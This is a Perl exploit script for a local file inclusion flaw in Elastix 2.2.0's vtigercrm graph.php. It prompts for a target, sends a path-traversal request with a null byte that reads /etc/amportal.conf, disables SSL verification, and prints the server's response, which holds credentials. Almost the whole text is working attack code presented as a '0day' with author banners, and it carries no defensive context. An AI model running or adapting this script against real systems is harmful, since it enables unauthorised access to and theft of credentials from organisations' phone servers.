#!/usr/bin/perl -w

#------------------------------------------------------------------------------------# 
#Elastix is an Open Source Sofware to establish Unified Communications. 
#About this concept, Elastix goal is to incorporate all the communication alternatives,
#available at an enterprise level, into a unique solution.
#------------------------------------------------------------------------------------#
############################################################
# Exploit Title: Elastix 2.2.0 LFI
# Google Dork: :(
# Author: cheki
# Version:Elastix 2.2.0
# Tested on: multiple
# CVE : notyet
# romanc-_-eyes ;) 
# Discovered by romanc-_-eyes
# vendor http://www.elastix.org/

print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki   \n";
print "\t 0day Elastix 2.2.0  \n";
print "\t email: anonymous17hacker{}gmail.com \n";

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

use LWP::UserAgent;
use IO::Socket::SSL;
print "\n Target: https://ip ";
chomp(my $target=<STDIN>);
print "You entered: $target\n";
$dir="vtigercrm";
$poc="current_language";
$etc="etc";
$jump="../../../../../../../..//";
$test="amportal.conf%00";

$code = LWP::UserAgent->new(
  ssl_opts => {
    SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE,
    verify_hostname => 0,
  }
);
$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = "https://" . $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";
print "Host is:" . $host . "\n";
$res = $code->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; 
if ($answer =~ 'This file is part of FreePBX' or 1==1) {
 
####### mine
print "Response code :" .  $res->code . "\n";
print "Response content:" . $res->content . "\n";

######
# print "read amportal.conf file : $answer \n";
# print " successful read\n";
 
}
else { 
  # print "[-] not successful\n";
	}
